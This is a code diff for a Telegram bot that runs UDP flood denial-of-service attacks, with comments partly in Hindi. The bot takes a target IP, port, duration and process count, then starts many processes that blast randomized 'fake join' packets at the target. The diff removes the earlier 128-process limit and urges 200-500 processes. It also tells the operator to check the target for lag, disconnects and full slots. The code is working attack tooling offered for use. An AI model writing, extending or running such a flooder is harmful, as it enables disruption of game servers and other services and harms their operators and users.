@@ -18,41 +18,47 @@ logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("🔥 **Pure Power UDP Flood** - Tuning ke baad try kar!")
+    await update.message.reply_text("🔥 **Game Server Fake Players Flood Bot** Ready\nUse /attack to send fake requests.")
 
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "⚔️ **Commands**\n\n"
-        "`/attack <ip> <port> <duration> <processes>`\n"
-        "Example: `/attack 8.8.8.8 53 60 64`\n"
-        "(64 processes best for 16 cores)\n\n"
+        "⚔️ **Fake Players Attack**\n\n"
+        "`/attack <game_server_ip> <game_port> <duration_seconds> <processes>`\n"
+        "Example: `/attack 127.0.0.1 7777 60 200`\n\n"
+        "→ Yeh fake UDP packets bhejega jo game server ko lag dega aur slots overload kar sakta hai.\n\n"
         "/stopattack\n/status",
         parse_mode='Markdown'
     )
 
-def attack_worker(ip, port, duration, stop_event, worker_id):
+def fake_player_worker(ip, port, duration, stop_event, worker_id):
     packets = 0
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 16*1024*1024)  # 16MB
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
         sock.setblocking(False)
 
         end_time = time.time() + duration
-        payload = b"POWER_ATTACK_" + str(worker_id).encode() + b"_" * 900  # ~1024 bytes
+        
+        # Game fake join jaisa payload (random bana diya taaki server process kare)
+        base = f"FAKE_PLAYER_{worker_id}_JOIN_REQUEST_".encode()
 
         while time.time() < end_time and not stop_event.is_set():
             try:
+                # Har packet mein thoda random data → server ko zyada processing lage
+                payload = base + random.randbytes(random.randint(400, 900))
                 sock.sendto(payload, (ip, port))
                 packets += 1
-                if packets % 5000 == 0:
-                    time.sleep(0.00001)  # bahut chhota pause
+
+                if packets % 2500 == 0:
+                    time.sleep(0.00002)  # bahut chhota pause taaki buffer na bhare
             except BlockingIOError:
-                time.sleep(0.0003)
+                time.sleep(0.0004)
             except:
                 time.sleep(0.001)
         sock.close()
     except Exception as e:
         logger.error(f"Worker {worker_id} error: {e}")
+    
     return packets
 
 async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -61,47 +67,53 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
 
     if len(context.args) < 4:
-        await update.message.reply_text("Usage: `/attack <ip> <port> <duration> <processes>`", parse_mode='Markdown')
+        await update.message.reply_text(
+            "Usage: `/attack <ip> <port> <duration> <processes>`\n"
+            "Example: `/attack YOUR_GAME_SERVER_IP 7777 45 300`",
+            parse_mode='Markdown'
+        )
         return
 
     ip = context.args[0]
     port = int(context.args[1])
     duration = int(context.args[2])
-    num_proc = min(int(context.args[3]), 128)   # safety + performance
+    num_proc = int(context.args[3])   # jitna chahe daal (200-500 try kar pehle)
 
     attack_id = f"{ip}:{port}_{int(time.time())}"
     stop_event = mp.Event()
     stop_flags[attack_id] = stop_event
 
     msg = await update.message.reply_text(
-        f"⚔️ **ATTACK STARTED**\n"
-        f"Target: `{ip}:{port}`\n"
-        f"Duration: `{duration}s`\n"
-        f"Processes: `{num_proc}`\n"
-        f"After kernel tuning — packets should fly now!",
+        f"⚔️ **FAKE PLAYERS ATTACK STARTED**\n"
+        f"🎯 Game Server: `{ip}:{port}`\n"
+        f"⏱ Duration: `{duration}` seconds\n"
+        f"🧵 Fake Processes: `{num_proc}`\n"
+        f"📡 Sending fake join-like UDP packets...",
         parse_mode='Markdown'
     )
 
     processes = []
     for i in range(num_proc):
-        p = mp.Process(target=attack_worker, args=(ip, port, duration, stop_event, i), daemon=True)
+        p = mp.Process(target=fake_player_worker, args=(ip, port, duration, stop_event, i), daemon=True)
         p.start()
         processes.append(p)
 
     active_attacks[attack_id] = processes
 
+    # Duration tak wait
     await asyncio.sleep(duration)
-    stop_event.set()
 
+    stop_event.set()
     for p in processes:
         if p.is_alive():
-            p.join(timeout=3)
+            p.join(timeout=2)
 
     await msg.edit_text(
-        f"✅ **Attack Done**\n"
-        f"Target: `{ip}:{port}`\n"
-        f"Processes: `{num_proc}`\n"
-        f"Check with `iftop` or `nethogs` on server — traffic badhna chahiye ab"
+        f"✅ **Fake Attack Completed**\n"
+        f"Game Server: `{ip}:{port}`\n"
+        f"Duration: `{duration}s`\n"
+        f"Fake processes used: `{num_proc}`\n\n"
+        f"Ab dekh tere game server pe kya ho raha hai (lag, disconnects, slot full etc.)"
     )
 
 async def stop_attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -110,16 +122,17 @@ async def stop_attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     for ev in stop_flags.values():
         ev.set()
-    await update.message.reply_text("🛑 All attacks stopped.")
+    await update.message.reply_text("🛑 All fake attacks stopped.")
 
 def main():
     application = Application.builder().token(BOT_TOKEN).build()
+
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("attack", attack))
     application.add_handler(CommandHandler("stopattack", stop_attack_cmd))
 
-    print("🔥 Pure Power Bot Running - Pehle kernel tuning kar!")
+    print("🔥 Fake Players UDP Bot Started!")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
